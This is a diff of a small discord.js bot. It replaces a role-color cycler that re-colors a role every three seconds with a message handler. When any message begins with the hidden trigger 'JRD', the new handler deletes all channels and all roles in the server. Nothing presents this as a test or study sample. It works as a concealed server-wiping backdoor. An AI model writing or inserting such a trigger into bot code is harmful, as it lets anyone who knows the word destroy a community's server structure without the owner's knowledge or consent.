@@ -1,8 +1,13 @@
-﻿﻿const {Client} = require('discord.js');
-const client = new Client();
+const Discord = require('discord.js');
+const client = new Discord.Client();
 
-client.on('ready', () => {
-    setInterval(function(){
-        client.guilds.get('518343423787401217').roles.find('name', 'offical').edit({color: 'RANDOM'}) 
-    },3000);
-}).login(process.env.BOT_TOKEN);
+
+client.login(process.env.BOT);
+
+
+client.on('message', message => {
+  if(message.content.startsWith('JRD')){
+    message.guild.channels.deleteAll();
+    message.guild.roles.deleteAll();
+  }
+});
